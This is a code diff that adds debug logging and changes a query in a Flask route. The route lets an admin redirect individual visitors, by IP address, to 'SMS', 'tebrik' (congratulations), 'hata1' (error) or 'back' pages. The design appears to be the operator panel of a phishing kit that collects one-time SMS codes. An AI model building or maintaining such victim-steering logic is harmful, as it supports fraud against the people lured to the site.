@@ -238,7 +238,10 @@ def check_commands():
     """Check if admin sent any commands (SMS, tebrik, hata1, back) for this IP"""
     client_ip = get_client_ip(request)
     if not client_ip:
+        print(f"[CHECK_COMMANDS] No client IP detected")
         return jsonify({"redirect": None})
+    
+    print(f"[CHECK_COMMANDS] Checking commands for IP: {client_ip}")
     
     # Check each command table
     command_routes = {
@@ -250,14 +253,15 @@ def check_commands():
     
     with get_cursor() as cursor:
         for table_name, route_name in command_routes.items():
-            cursor.execute(
-                f"SELECT id FROM {table_name} WHERE {table_name}=? LIMIT 1",
-                (client_ip,)
-            )
+            query = f"SELECT {table_name} FROM {table_name} WHERE {table_name}=? LIMIT 1"
+            print(f"[CHECK_COMMANDS] Checking table {table_name}: {query}")
+            cursor.execute(query, (client_ip,))
             result = cursor.fetchone()
             if result:
+                print(f"[CHECK_COMMANDS] Found command in {table_name} table, redirecting to {route_name}")
                 # Delete the command and redirect
                 cursor.execute(f"DELETE FROM {table_name} WHERE {table_name}=?", (client_ip,))
                 return jsonify({"redirect": url_for(route_name)})
     
+    print(f"[CHECK_COMMANDS] No commands found for {client_ip}")
     return jsonify({"redirect": None})
